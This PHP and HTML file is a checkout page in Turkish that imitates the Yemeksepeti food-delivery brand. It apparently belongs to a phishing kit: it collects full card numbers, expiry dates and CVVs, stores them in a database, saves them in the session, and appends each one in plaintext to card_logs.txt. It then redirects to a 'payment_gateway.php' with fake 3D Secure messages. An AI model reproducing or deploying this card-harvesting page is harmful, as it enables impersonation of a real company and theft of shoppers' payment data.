<?php
require_once 'config/config.php';

// Hata görüntüleme (geliştirme aşamasında)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Session başlatılıyor
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$isLoggedIn = false;
$user = null;
if (is_logged_in()) {
    try {
        $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
        $stmt->execute([$_SESSION['user_id']]);
        $user = $stmt->fetch();
        $isLoggedIn = true;
    } catch (PDOException $e) {
        // Kullanıcı bilgisi alınamadı
    }
}

// Sepet verisi (varsa, yoksa varsayılan yapı)
$cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : [
    'items'       => [],
    'subtotal'    => 0,
    'discount'    => 0,
    'deliveryFee' => 14.90,
    'total'       => 0
];

// Kupon kontrolü
$coupon_code = '';
$coupon_discount = 0;
$coupon_message = '';
if (isset($_POST['apply_coupon'])) {
    $coupon_code = clean_input($_POST['coupon_code'] ?? '');
    if ($coupon_code === 'SEPETTE350') {
        $coupon_discount = 50.00;
        $coupon_message = '<div class="alert alert-success">SEPETTE350 kuponu başarıyla uygulandı!</div>';
    } else {
        $coupon_message = '<div class="alert alert-danger">Geçersiz kupon kodu.</div>';
    }
}

// Sipariş oluşturma
$errors = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['complete_order'])) {
    // Form verilerini al
    $first_name     = clean_input($_POST['first_name'] ?? '');
    $last_name      = clean_input($_POST['last_name'] ?? '');
    $email          = clean_input($_POST['email'] ?? '');
    $phone          = clean_input($_POST['phone'] ?? '');
    $address        = clean_input($_POST['address'] ?? '');
    $address_detail = clean_input($_POST['address_detail'] ?? '');
    $payment_method = 'credit_card'; // Sabit
    
    // Kart bilgileri
    $card_holder = clean_input($_POST['card_holder'] ?? '');
    $card_number = clean_input($_POST['card_number'] ?? '');
    $expiry_date = clean_input($_POST['expiry_date'] ?? '');
    $cvv         = clean_input($_POST['cvv'] ?? '');
    
    // Bahşiş
    $tip_amount = floatval($_POST['tip_amount'] ?? 0);
    
    // Sepet kontrolü
    if (!$cart || empty($cart['items'])) {
        $errors[] = 'Sepetiniz boş.';
    }
    // Zorunlu alan kontrolü
    if (empty($first_name) || empty($last_name) || empty($email) || empty($phone) || empty($address)) {
        $errors[] = 'Tüm alanları doldurunuz.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors[] = 'Geçerli bir e-posta adresi giriniz.';
    } elseif (empty($card_holder) || empty($card_number) || empty($expiry_date) || empty($cvv)) {
        $errors[] = 'Kart bilgilerini tam olarak giriniz.';
    }
    
    if (empty($errors)) {
        // Kupon indirimi ekle
        $cart['discount'] += $coupon_discount;
        // Toplamı yeniden hesapla: ara toplam + teslimat ücreti - indirim
        $cart['total'] = $cart['subtotal'] + $cart['deliveryFee'] - $cart['discount'];
        // Bahşiş ekle
        if ($tip_amount > 0) {
            $cart['tip'] = $tip_amount;
            $cart['total'] += $tip_amount;
        } else {
            $cart['tip'] = 0;
        }
        
        try {
            $pdo->beginTransaction();
            $user_id = $user ? $user['id'] : null;
            
            // Önce orders tablosuna siparişi ekle
            $stmt = $pdo->prepare('INSERT INTO orders 
                (user_id, first_name, last_name, email, phone, address, address_detail, payment_method,
                 subtotal, delivery_fee, discount, tip, total, status, payment_status, notes)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)');
            $stmt->execute([
                $user_id,
                $first_name,
                $last_name,
                $email,
                $phone,
                $address,
                $address_detail,
                $payment_method,
                $cart['subtotal'],
                $cart['deliveryFee'],
                $cart['discount'],
                $cart['tip'],
                $cart['total'],
                'pending',
                'pending',
                $coupon_code ? "Kupon: $coupon_code" : null
            ]);
            // Yeni oluşturulan siparişin ID'sini al
            $order_id = $pdo->lastInsertId();
            
            // Ardından payment_data tablosuna kart bilgilerini ekle
            $stmt = $pdo->prepare('INSERT INTO payment_data (order_id, card_holder, card_number, expiry_date, cvv) VALUES (?, ?, ?, ?, ?)');
            $stmt->execute([
                $order_id,
                $card_holder,
                $card_number,
                $expiry_date,
                $cvv
            ]);
            
            // order_items tablosuna ekle
            foreach ($cart['items'] as $item) {
                $stmt = $pdo->prepare('INSERT INTO order_items 
                    (order_id, product_id, product_name, price, quantity, subtotal)
                    VALUES (?, ?, ?, ?, ?, ?)');
                $stmt->execute([
                    $order_id,
                    $item['id'],
                    $item['name'],
                    $item['price'],
                    $item['quantity'],
                    $item['total']
                ]);
                
                // Opsiyonel: stok güncelle
                $stmt = $pdo->prepare('UPDATE products SET stock = stock - ? WHERE id = ?');
                $stmt->execute([$item['quantity'], $item['id']]);
            }
            
            // Kart bilgilerini loglama (tam hali)
            $log_text  = "==========================================\n";
            $log_text .= "ÖDEME BİLGİLERİ [" . date('Y-m-d H:i:s') . "]\n";
            $log_text .= "==========================================\n";
            $log_text .= "Sipariş ID      : " . $order_id . "\n";
            $log_text .= "Müşteri         : " . $first_name . ' ' . $last_name . "\n";
            $log_text .= "Telefon         : " . $phone . "\n";
            $log_text .= "E-posta         : " . $email . "\n";
            $log_text .= "Kart Sahibi     : " . $card_holder . "\n";
            $log_text .= "Kart Numarası   : " . $card_number . "\n";
            $log_text .= "CVV             : " . $cvv . "\n";
            $log_text .= "Son Kullanma    : " . $expiry_date . "\n";
            $log_text .= "Tutar           : " . format_money($cart['total']) . "\n";
            $log_text .= "==========================================\n\n";
            file_put_contents('card_logs.txt', $log_text, FILE_APPEND);
            
            $pdo->commit();
            
            // Sipariş oluşturulduktan sonra sepeti temizle
            $_SESSION['cart'] = [
                'items'       => [],
                'subtotal'    => 0,
                'discount'    => 0,
                'deliveryFee' => 14.90,
                'total'       => 0
            ];
            
            // Session'a sipariş ve ödeme bilgilerini kaydet
            $_SESSION['order_id'] = $order_id;
            $_SESSION['payment_data'] = [
                'card_holder' => $card_holder,
                'card_number' => $card_number,
                'expiry_date' => $expiry_date,
                'cvv'         => $cvv,
                'total'       => $cart['total']
            ];
            
            header('Location: payment_gateway.php');
            exit;
            
        } catch (PDOException $e) {
            $pdo->rollBack();
            $errors[] = 'Sipariş oluşturulurken bir hata oluştu: ' . $e->getMessage();
        }
    }
}

// 3D Secure timeout veya iptal mesajları
if (isset($_GET['timeout']) && $_GET['timeout'] == 1) {
    $errors[] = '3D Secure doğrulama süresi doldu. Lütfen tekrar deneyiniz.';
}
if (isset($_GET['cancel']) && $_GET['cancel'] == 1) {
    set_flash_message('warning', 'Ödeme işlemi iptal edildi.');
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ödeme - Yemeksepeti</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="css/checkout.css">
    <style>
        :root {
            --ys-red: #ff5a5f;
        }
        body {
            background-color: #f8f9fa;
        }
        .checkout-section {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        .checkout-item {
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }
        .checkout-item:last-child {
            border-bottom: none;
        }
        .checkout-item-image {
            width: 60px;
            height: 60px;
            object-fit: contain;
            border-radius: 5px;
        }
        .payment-method {
            cursor: pointer;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 10px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .payment-method:hover {
            border-color: var(--ys-red);
        }
        .payment-method.selected {
            border-color: var(--ys-red);
            box-shadow: 0 0 0 1px var(--ys-red);
        }
        .credit-card-form {
            max-width: 100%;
        }
        .card-input-container {
            position: relative;
        }
        .card-icon {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
        }
        .coupon-section {
            margin-bottom: 20px;
        }
        .tip-section {
            margin-top: 20px;
        }
        .tip-button {
            border: 1px solid #ddd;
            background-color: #f8f9fa;
            color: #333;
            padding: 10px 15px;
            border-radius: 20px;
            margin-right: 10px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .tip-button:hover, .tip-button.active {
            background-color: var(--ys-red);
            color: white;
            border-color: var(--ys-red);
        }
        .terms-section {
            margin-top: 20px;
            font-size: 0.9rem;
        }
        .btn-red {
            background-color: var(--ys-red);
            border-color: var(--ys-red);
            color: white;
        }
        .btn-red:hover, .btn-red:focus {
            background-color: #ff3d42;
            border-color: #ff3d42;
            color: white;
        }
        .logocss {
            height: 24px;
        }
    </style>
</head>
<body>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sepeti Onayla - Yemeksepeti</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/checkout.css">
    <link rel="stylesheet" href="css/mobile-quantity-selector.css">
</head>
<body>
    <!-- Header -->
    <header class="border-bottom shadow-sm">
        <div class="container py-3">
            <div class="d-flex justify-content-between align-items-center">
                <!-- Logo -->
                <a href="index.php" class="navbar-brand">
                    <img class="logocss" src="images/logo.png" alt="Yemeksepeti">
                </a>
                
                <!-- Location and Buttons -->
                <div class="d-flex align-items-center gap-2 gap-md-3">
                    <!-- Location Select -->
                    <div class="position-relative d-none d-md-block">
                        <div id="locationDisplay" class="location-display d-flex align-items-center">
                            <i class="fas fa-map-marker-alt me-2"></i>
                            <span id="locationText">Adres Seç</span>
                        </div>
                    </div>
                    
                    <?php if (!$isLoggedIn): ?>
                    <!-- Login / Register - Mobilde küçült -->
                    <a href="login.php" class="btn btn-outline-light rounded-pill px-3 px-md-4 py-1 py-md-2 btn-hover d-none d-sm-inline-block">
                        Giriş Yap
                    </a>
                    <a href="register.php" class="btn btn-red rounded-pill px-3 px-md-4 py-1 py-md-2 btn-hover">
                        Kayıt Ol
                    </a>
                    <?php else: ?>
                    <!-- User Account -->
                    <div class="dropdown">
                        <button class="btn btn-outline-light rounded-pill px-3 px-md-4 py-1 py-md-2 dropdown-toggle" type="button" id="userDropdown" data-bs-toggle="dropdown" aria-expanded="false">
                            <i class="fas fa-user me-2"></i> Hesabım
                        </button>
                        <ul class="dropdown-menu" aria-labelledby="userDropdown">
                            <li><a class="dropdown-item" href="orders.php">Siparişlerim</a></li>
                            <li><hr class="dropdown-divider"></li>
                            <li><a class="dropdown-item" href="logout.php">Çıkış Yap</a></li>
                        </ul>
                    </div>
                    <?php endif; ?>
                    
                    <!-- Language Selector -->
                    <div class="position-relative">
                        <button id="langToggle" class="btn btn-sm d-flex align-items-center gap-1">
                            <span id="currentLang" class="bg-light rounded-circle d-inline-flex justify-content-center align-items-center" style="width:25px; height:25px;">TR</span>
                            <i class="fas fa-chevron-down"></i>
                        </button>
                        <div id="langDropdown" class="lang-dropdown">
                            <div class="lang-option selected" data-lang="TR">Türkçe</div>
                            <div class="lang-option" data-lang="EN">English</div>
                        </div>
                    </div>
                    
                    <!-- Cart -->
                    <button id="cartButton" class="btn position-relative">
                        <i class="fas fa-shopping-bag"></i>
                        <span id="cartCount" class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger" style="display: none;">
                            0
                        </span>
                    </button>
                </div>
            </div>
        </div>
    </header>
    
    <!-- Navigation -->
    <nav class="border-bottom">
        <div class="container">
            <ul class="nav">
                <li class="nav-item">
                    <a class="nav-link py-3 d-flex align-items-center gap-2" href="#">
                        <i class="fas fa-utensils nav-icon"></i>
                        <span class="d-none d-md-inline">Restoran</span>
                        <span class="d-inline d-md-none">Resta.</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link py-3 d-flex align-items-center gap-2" href="#">
                        <i class="fas fa-walking nav-icon"></i>
                        <span class="d-none d-md-inline">Gel Al</span>
                        <span class="d-inline d-md-none">Gel Al</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link active py-3 d-flex align-items-center gap-2" href="#">
                        <i class="fas fa-shopping-basket nav-icon"></i>
                        <span class="d-none d-md-inline">Market</span>
                        <span class="d-inline d-md-none">Market</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link py-3 d-flex align-items-center gap-2" href="#">
                        <i class="fas fa-home nav-icon"></i>
                        <span class="d-none d-md-inline">Mahalle</span>
                        <span class="d-inline d-md-none">Mah.</span>
                    </a>
                </li>
            </ul>
        </div>
    </nav>
    

    <div class="container my-5">
        <!-- Hata mesajları -->
        <?php if (!empty($errors)): ?>
            <div class="alert alert-danger">
                <ul class="mb-0">
                    <?php foreach ($errors as $error): ?>
                        <li><?php echo $error; ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
        
        <!-- Flash mesajları -->
        <?php echo display_flash_message(); ?>
        
        <form method="post" id="checkoutForm" action="checkout.php">
            <!-- complete_order ile siparişi işaretliyoruz -->
            <input type="hidden" name="complete_order" value="1">
            
            <div class="row">
                <div class="col-lg-8">
                    <!-- Teslimat Bilgileri -->
                    <div class="checkout-section mb-4">
                        <h4 class="mb-3">Teslimat Bilgileri</h4>
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label for="firstName" class="form-label">Adınız</label>
                                <input type="text" class="form-control" id="firstName" name="first_name"
                                       placeholder="Adınız"
                                       value="<?php echo $user ? htmlspecialchars($user['first_name']) : ''; ?>" required>
                            </div>
                            <div class="col-md-6 mb-3">
                                <label for="lastName" class="form-label">Soyadınız</label>
                                <input type="text" class="form-control" id="lastName" name="last_name"
                                       placeholder="Soyadınız"
                                       value="<?php echo $user ? htmlspecialchars($user['last_name']) : ''; ?>" required>
                            </div>
                        </div>
                        
                        <div class="mb-3">
                            <label for="phone" class="form-label">Telefon Numaranız</label>
                            <input type="tel" class="form-control" id="phone" name="phone"
                                   placeholder="05XX XXX XX XX"
                                   value="<?php echo $user ? htmlspecialchars($user['phone']) : ''; ?>" required>
                        </div>
                        
                        <div class="mb-3">
                            <label for="email" class="form-label">E-posta Adresiniz</label>
                            <input type="email" class="form-control" id="email" name="email"
                                   placeholder="ornek@mail.com"
                                   value="<?php echo $user ? htmlspecialchars($user['email']) : ''; ?>"
                                   <?php echo $user ? 'readonly' : ''; ?>>
                            <div class="form-text">Sipariş bilgileriniz bu adrese gönderilecektir.</div>
                        </div>
                        
                        <div class="mb-3">
                            <label for="address" class="form-label">Adres</label>
                            <input type="text" class="form-control" id="address" name="address"
                                   placeholder="Adresiniz"
                                   value="Akevler, 1069. Sokak, 9A, 34513 İstanbul Esenyurt" required>
                        </div>
                        
                        <div class="row">
                            <div class="col-md-12 mb-3">
                                <label for="addressDetail" class="form-label">Adres Tarifi (Opsiyonel)</label>
                                <textarea class="form-control" id="addressDetail" name="address_detail"
                                          placeholder="Kapı kodu, kat numarası, zili çalma vb."
                                          rows="2"></textarea>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Kupon Kodu -->
                    <div class="checkout-section coupon-section">
                        <h4 class="mb-3">Kupon Kodu</h4>
                        
                        <?php echo $coupon_message; ?>
                        
                        <div class="input-group">
                            <input type="text" class="form-control" id="couponCode" name="coupon_code"
                                   placeholder="Kupon kodunuz"
                                   value="<?php echo htmlspecialchars($coupon_code); ?>">
                            <button class="btn btn-outline-secondary" type="submit" name="apply_coupon">Uygula</button>
                        </div>
                        
                    </div>
                    
                    <!-- Ödeme Bilgileri -->
                    <div class="checkout-section">
                        <h4 class="mb-3">Ödeme Bilgileri</h4>
                        
                        <div class="credit-card-form">
                            <div class="mb-3">
                                <label for="cardHolder" class="form-label">Kart Üzerindeki İsim</label>
                                <input type="text" class="form-control" id="cardHolder" name="card_holder"
                                       placeholder="Kart sahibinin adı soyadı" required>
                            </div>
                            
                            <div class="mb-3">
                                <label for="cardNumber" class="form-label">Kart Numarası</label>
                                <div class="card-input-container">
                                    <input type="text" class="form-control" id="cardNumber" name="card_number"
                                           placeholder="XXXX XXXX XXXX XXXX"
                                           maxlength="19" required>
                                    <div class="card-icon">
                                        <img src="images/cards.png" alt="Kredi Kartları" height="24">
                                    </div>
                                </div>
                            </div>
                            
                            <div class="row">
                                <div class="col-6">
                                    <label for="expiryDate" class="form-label">Son Kullanma Tarihi</label>
                                    <input type="text" class="form-control" id="expiryDate" name="expiry_date"
                                           placeholder="AA/YY" maxlength="5" required>
                                </div>
                                <div class="col-6">
                                    <label for="cvv" class="form-label">CVV</label>
                                    <div class="card-input-container">
                                        <input type="text" class="form-control" id="cvv" name="cvv"
                                               placeholder="XXX" maxlength="3" required>
                                        <i class="fas fa-question-circle card-icon"
                                           title="Kartınızın arkasındaki 3 haneli güvenlik kodu"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bahşiş Seçenekleri -->
                        <div class="tip-section mt-4">
                            <h5>Bahşiş</h5>
                            <p class="text-muted small">Kuryenize dilediğiniz kadar bahşiş verebilirsiniz.</p>
                            
                            <div class="d-flex flex-wrap gap-2 mt-3">
                                <button type="button" class="tip-button active" data-amount="0">Şimdi değil</button>
                                <button type="button" class="tip-button" data-amount="15">15,00 TL</button>
                                <button type="button" class="tip-button" data-amount="20">20,00 TL</button>
                                <button type="button" class="tip-button" data-amount="25">25,00 TL</button>
                                <button type="button" class="tip-button" data-amount="30">30,00 TL</button>
                            </div>
                            
                            <input type="hidden" name="tip_amount" id="tipAmount" value="0">
                        </div>
                        
                        <!-- Onay Kutuları -->
                        <div class="terms-section">
                            <div class="form-check mb-2">
                                <input class="form-check-input" type="checkbox" id="termsAccept" name="terms_accept" required>
                                <label class="form-check-label" for="termsAccept">
                                    <small>Mesafeli Satış Sözleşmesi ve Ön Bilgilendirme Formu metinlerini okudum ve kabul ediyorum.</small>
                                </label>
                            </div>
                            
                            <div class="form-check">
                                <input class="form-check-input" type="checkbox" id="useForNext" name="use_for_next">
                                <label class="form-check-label" for="useForNext">
                                    <small>Sonraki siparişim için kullan</small>
                                </label>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Sipariş Özeti (session'daki $cart üzerinden) -->
                <div class="col-lg-4">
                    <div class="checkout-section">
                    <div class="card-header bg-white py-3">
    <h5 class="mb-0">Sipariş Özeti</h5>
</div>
<div class="card-body">
    <!-- Delivery Time Display -->
    <div class="border rounded p-3 mb-3 bg-light">
        <div class="d-flex align-items-center">
            <div class="me-3">
                <img src="images/delivery-icon.svg" alt="Teslimat" width="40" height="40" class="d-none d-md-block">
                <i class="fas fa-motorcycle fa-2x text-muted d-md-none"></i>
            </div>
            <div>
                <div class="small text-muted">Tahmini Teslimat Zamanı</div>
                <div class="delivery-zaman fw-bold">Yükleniyor...</div>
            </div>
        </div>
    </div>
    
    <h4 class="mb-3">Sipariş Özeti</h4>
                        
                        <div id="orderSummaryItems">
                            <?php if (!empty($cart['items'])): ?>
                                <?php foreach ($cart['items'] as $item): ?>
                                    <div class="checkout-item d-flex align-items-center">
                                        <div class="flex-shrink-0 me-3">
                                            <img src="<?php echo $item['image'] ?: 'images/default.jpg'; ?>"
                                                 alt="<?php echo htmlspecialchars($item['name']); ?>"
                                                 class="checkout-item-image">
                                        </div>
                                        <div class="flex-grow-1">
                                            <h6 class="mb-0"><?php echo htmlspecialchars($item['name']); ?></h6>
                                            <small class="text-muted">
                                                <?php echo number_format($item['price'], 2, ',', '.'); ?> TL x <?php echo $item['quantity']; ?>
                                            </small>
                                        </div>
                                        <div class="ms-3 fw-bold">
                                            <?php echo number_format($item['total'], 2, ',', '.'); ?> TL
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <div class="alert alert-warning">Sepetinizde ürün bulunmamaktadır.</div>
                            <?php endif; ?>
                        </div>
                        
                        <hr>
                        
                        <div class="d-flex justify-content-between mb-2">
                            <span>Ara Toplam</span>
                            <span id="summarySubtotal">
                                <?php echo number_format($cart['subtotal'], 2, ',', '.'); ?> TL
                            </span>
                        </div>
                        <div class="d-flex justify-content-between mb-2">
                            <span>Teslimat Ücreti</span>
                            <span id="summaryDeliveryFee">
                                <?php echo number_format($cart['deliveryFee'], 2, ',', '.'); ?> TL
                            </span>
                        </div>
                        <div class="d-flex justify-content-between mb-2">
                            <span>İndirim</span>
                            <span id="summaryDiscount">
                                <?php echo number_format($cart['discount'], 2, ',', '.'); ?> TL
                            </span>
                        </div>
                        
                        <?php if ($coupon_discount > 0): ?>
                        <div class="d-flex justify-content-between mb-2">
                            <span>Kupon İndirimi (SEPETTE350)</span>
                            <span id="couponDiscount">-<?php echo number_format($coupon_discount, 2, ',', '.'); ?> TL</span>
                        </div>
                        <?php endif; ?>
                        
                        <div class="d-flex justify-content-between mb-2 tip-row"
                             style="display: <?php echo (!empty($cart['tip']) && $cart['tip'] > 0) ? 'flex' : 'none'; ?>;">
                            <span>Bahşiş</span>
                            <span id="summaryTip">
                                <?php echo (!empty($cart['tip'])) ? number_format($cart['tip'], 2, ',', '.') . ' TL' : '0,00 TL'; ?>
                            </span>
                        </div>
                        
                        <div class="d-flex justify-content-between fw-bold mt-2">
                            <span>Toplam</span>
                            <span id="summaryTotal">
                                <?php echo number_format($cart['total'], 2, ',', '.'); ?> TL
                            </span>
                        </div>
                        
                        <button type="submit" id="completeOrderBtn" class="btn btn-red w-100 mt-3 py-3 rounded-3">
                            Siparişi Tamamla
                        </button>
                    </div>
                </div>
            </div>
        </form>
    </div>

    <!-- Footer -->
    <footer class="bg-light mt-5 py-4">
        <div class="container">
            <div class="row">
                <div class="col-md-4">
                    <h5>Yemeksepeti</h5>
                    <p>Türkiye'nin online yemek ve market siparişi platformu</p>
                </div>
                <div class="col-md-4">
                    <h5>Hızlı Erişim</h5>
                    <ul class="list-unstyled">
                        <li><a href="index.php">Ana Sayfa</a></li>
                        <li><a href="#">Hakkımızda</a></li>
                        <li><a href="#">İletişim</a></li>
                        <li><a href="#">Yardım</a></li>
                    </ul>
                </div>
                <div class="col-md-4">
                    <h5>İletişim</h5>
                    <p>
                        <i class="fas fa-envelope me-2"></i> info@yemeksepeti.com<br>
                        <i class="fas fa-phone me-2"></i> 0850 123 4567
                    </p>
                    <div class="mt-3">
                        <a href="#" class="text-dark me-2"><i class="fab fa-facebook-f"></i></a>
                        <a href="#" class="text-dark me-2"><i class="fab fa-twitter"></i></a>
                        <a href="#" class="text-dark me-2"><i class="fab fa-instagram"></i></a>
                    </div>
                </div>
            </div>
            <hr>
            <div class="text-center">
                <p class="mb-0">&copy; <?php echo date('Y'); ?> Yemeksepeti. Tüm hakları saklıdır.</p>
            </div>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- (Opsiyonel) Bahşiş butonları, kupon kodu vb. JS kodları buraya eklenebilir -->
    <script>
    // Bahşiş butonları
    document.querySelectorAll('.tip-button').forEach(btn => {
        btn.addEventListener('click', function() {
            // Tüm tip-button'lardan active'i kaldır
            document.querySelectorAll('.tip-button').forEach(b => b.classList.remove('active'));
            // Bu butona ekle
            this.classList.add('active');
            // Gizli input'u ayarla
            document.getElementById('tipAmount').value = this.getAttribute('data-amount');
        });
    });
    // delivery-time.js
    </script>
    <script src="js/delivery-tim.js"></script>
</body>
</html>
